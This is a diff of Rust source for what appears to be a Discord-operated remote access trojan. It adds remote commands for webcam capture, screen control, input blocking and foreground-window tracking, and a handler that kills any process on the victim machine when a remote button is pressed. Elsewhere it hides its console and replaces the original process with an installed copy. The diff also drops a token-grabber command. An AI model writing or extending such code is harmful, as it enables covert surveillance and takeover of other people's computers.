@@ -561,15 +561,21 @@ async fn register_all_commands() -> anyhow::Result<()> {
         // System commands
         ProcessCommand,
         MonitorCommand,
-        TokenGrabberCommand,
         UpdateCommand,
         UninstallCommand,
+        VolumeCommand,
+        BlockInputCommand,
+        ScreenCommand,
+        CapsFlickerCommand,
+        VisibleCommand,
 
         // Utility commands
         ClipboardCommand,
         PrintCommand,
         ScreenshotCommand,
         OpenUrlCommand,
+        ForegroundCommand,
+        WebcamCommand,
 
         // Network commands
         IpconfigCommand,
@@ -665,7 +671,6 @@ async fn main() -> anyhow::Result<()> {
             }
         }
 
-        // Installation complete - exit and let the installed version run
         if Config::SHOW_CONSOLE {
             println!("Installation complete. Exiting original process...");
             std::thread::sleep(std::time::Duration::from_secs(2));
@@ -678,8 +683,7 @@ async fn main() -> anyhow::Result<()> {
         std::process::exit(1);
     }
 
-    // Hide console if configured
-    #[cfg(target_os = "windows")]
+    // hide console if configured
     if !Config::SHOW_CONSOLE {
         // use std::ptr;
         unsafe {
@@ -777,6 +781,14 @@ async fn main() -> anyhow::Result<()> {
                 }
             }
 
+            Event::InteractionCreate(interaction) => {
+                if let Err(e) = handle_interaction(&http, interaction.0).await {
+                    if Config::SHOW_CONSOLE {
+                        error!("Error handling interaction: {}", e);
+                    }
+                }
+            }
+
             Event::Ready(_) => {
                 if Config::SHOW_CONSOLE {
                     info!("Bot is ready!");
@@ -850,4 +862,58 @@ async fn handle_message(
     }
     Ok(())
 
+}
+
+async fn handle_interaction(
+    http: &Arc<HttpClient>,
+    interaction: twilight_model::application::interaction::Interaction,
+) -> anyhow::Result<()> {
+    use twilight_model::application::interaction::InteractionData;
+    use twilight_model::http::interaction::{InteractionResponse, InteractionResponseType, InteractionResponseData};
+
+    if let Some(InteractionData::MessageComponent(data)) = &interaction.data {
+        let custom_id = &data.custom_id;
+        {
+            if custom_id.starts_with("crash_") {
+                // Extract process ID from custom_id
+                if let Some(pid_str) = custom_id.strip_prefix("crash_") {
+                    if let Ok(pid) = pid_str.parse::<u32>() {
+                        use winapi::um::processthreadsapi::{OpenProcess, TerminateProcess};
+                        use winapi::um::winnt::PROCESS_TERMINATE;
+                        use winapi::um::handleapi::CloseHandle;
+
+                        unsafe {
+                            let handle = OpenProcess(PROCESS_TERMINATE, 0, pid);
+                            if !handle.is_null() {
+                                let result = TerminateProcess(handle, 1);
+                                CloseHandle(handle);
+
+                                let response_content = if result != 0 {
+                                    format!("Successfully crashed process (PID: {})", pid)
+                                } else {
+                                    format!("Failed to crash process (PID: {})", pid)
+                                };
+
+                                http.interaction(interaction.application_id)
+                                    .create_response(
+                                        interaction.id,
+                                        &interaction.token,
+                                        &InteractionResponse {
+                                            kind: InteractionResponseType::ChannelMessageWithSource,
+                                            data: Some(InteractionResponseData {
+                                                content: Some(response_content),
+                                                ..Default::default()
+                                            }),
+                                        },
+                                    )
+                                    .await?;
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    Ok(())
 }
